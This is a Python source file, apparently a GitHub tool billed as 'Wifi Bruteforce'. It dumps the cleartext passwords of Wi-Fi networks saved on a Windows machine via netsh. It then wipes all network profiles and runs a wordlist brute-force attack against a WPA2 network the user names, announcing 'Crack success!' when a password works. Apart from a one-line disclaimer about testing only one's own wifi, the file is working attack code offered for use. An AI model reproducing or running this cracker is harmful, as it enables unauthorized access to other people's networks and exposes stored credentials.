try:
    import pip
    import importlib
    modules = ['tabulate', 'pywifi', 'colorama']
    for module in modules:
        try:
            importlib.import_module(module)
        except:
            pip.main(['install', module])
    from tabulate import tabulate
    import platform
    import os
    import time
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile
    import colorama
    from colorama import Fore, Style
    import subprocess
    import sys
    import logging

    # Отключение вывода сообщений от pywifi
    logging.getLogger('pywifi').setLevel(logging.ERROR)

    colorama.init(autoreset=True)

    def show_logo():
        system = platform.system()
        os.system('cls' if system == 'Windows' else 'clear')

        print(Fore.LIGHTGREEN_EX + """
██╗    ██╗██╗███████╗██╗                                                           
██║    ██║██║██╔════╝██║                                                           
██║ █╗ ██║██║█████╗  ██║                                                           
██║███╗██║██║██╔══╝  ██║                                                           
╚███╔███╔╝██║██║     ██║                                                           
╚══╝╚══╝ ╚═╝╚═╝     ╚═╝                                                           
                                                                                    
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                    Windows Version 2.0     By DenTs123 (GitHub)""")
    def update_msg(text):
        message = f'\r{text}'
        sys.stdout.write(message)
        sys.stdout.flush()

    def main1():
        show_logo()
        def main12():
            def get_wifi_profiles():
                system = platform.system()

                if system == "Windows":
                    # Запуск команды и получение вывода
                    output = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8")

                    # Разделение вывода на строки
                    lines = output.split('\n')

                    # Поиск и извлечение имени профиля Wi-Fi сети
                    profiles = []
                    for line in lines:
                        if "User Profile" in line:
                            profile = line.split(":")[1].strip()
                            profiles.append(profile)

                    # Получение паролей для каждого профиля
                    results = []
                    for profile in profiles:
                        command = f"netsh wlan show profile name=\"{profile}\" key=clear"
                        output = subprocess.check_output(command, shell=True).decode("utf-8")

                        # Поиск и извлечение пароля Wi-Fi сети
                        password_line = [line.split(":")[1].strip() for line in output.split('\n') if "Key Content" in line]

                        if password_line:
                            password = password_line[0]
                            results.append([profile, password])

                    return results

                else:
                    return []


            def print_wifi_profiles(profiles):
                # Вывод результатов в виде таблицы
                system = platform.system()
                if system == 'Windows':
                    print(Fore.LIGHTRED_EX + "!!! WARNING !!!\nThere are the SSIDs and passwords that are saved in your PC\nWhen you start cracking wifi the ALL PROFILES WILL BE CLEARED!!!\nPlease save it or copy it\nNote: The hacking wifi is illegal, please use this program only for checking security of your wifi\nSaved passwords (on your PC):\n")
                for profile in profiles:
                    ssid, password = profile
                    print(f"SSID: {ssid}")
                    print(f"Password: {password}")
                    print()

            # Получение списка SSID и паролей
            saved_profiles = get_wifi_profiles()

            # Вывод SSID и паролей
            print_wifi_profiles(saved_profiles)

            wifi = PyWiFi()
            ifaces = wifi.interfaces()[0]
            results = None

            def password_correct(ssid, password):
                profile = Profile()  # create profile instance
                profile.ssid = ssid  # name of client
                profile.auth = const.AUTH_ALG_OPEN  # auth algo
                profile.akm.append(const.AKM_TYPE_WPA2PSK)  # key management
                profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher

                profile.key = password  # use generated password
                ifaces.remove_all_network_profiles()  # remove all the profiles which are previously connected to the device
                tmp_profile = ifaces.add_network_profile(profile)  # add new profile
                time.sleep(0.1)  # if script not working change time to 1 !!!!!!
                ifaces.connect(tmp_profile)  # trying to Connect
                time.sleep(0.30)  # 1s

                if ifaces.status() == const.IFACE_CONNECTED:  # checker
                    time.sleep(1)
                    update_msg(Fore.GREEN + f"Crack success! Password is {password}" + f'{" " * int(len(password) + 1)}' + Style.RESET_ALL)
                    return True
                else:
                    update_msg(Fore.RED + f"Incorrect password: {password}" + f'{" " * int(len(password) + 1)}' + Style.RESET_ALL)
                    return False

            def crack_passwords(ssid, file):
                with open(file, 'r', encoding='utf8') as words:
                    for line in words:
                        line = line.rstrip("\n")
                        password = line
                        if password_correct(ssid, password):
                            break
                        else:
                            pass

            selected_network = input(Fore.CYAN + 'Input the SSID (name) of network that you want to crack: ' + Fore.RESET)
            # Prompt for file selection
            file_path = None
            while file_path is None:
                user_input = input(Fore.CYAN + "Enter the file path for cracking: " + Fore.RESET)
                if user_input:
                    file_path = user_input
                else:
                    print(Fore.RED + "Invalid file path. Please try again.")

            crack_passwords(selected_network, file_path)
        main12()

    def generator():
        show_logo()
        print(Fore.CYAN + Style.BRIGHT + """
██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                                                """)

    def main():
        show_logo()
        print(Fore.CYAN + Style.BRIGHT + """
███╗   ███╗███████╗███╗   ██╗██╗   ██╗
████╗ ████║██╔════╝████╗  ██║██║   ██║
██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║
██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
                                        """)
        print(Fore.LIGHTGREEN_EX + '[1] Launch "Wifi bruteforce"\n[2] Password generator\n[3] About author')
        print()
        user_input = input(Fore.CYAN + "> " + Fore.RESET)
        if user_input == '1':
            main1()
        elif user_input == '2':
            generator()
        elif user_input == '3':
            pass


    if __name__ == "__main__":
        main()

except KeyboardInterrupt:
    print(Fore.RED + '\n\nExiting program...\n')
except Exception as e:
    print(Fore.RED + str(f'\n\n{e}'))
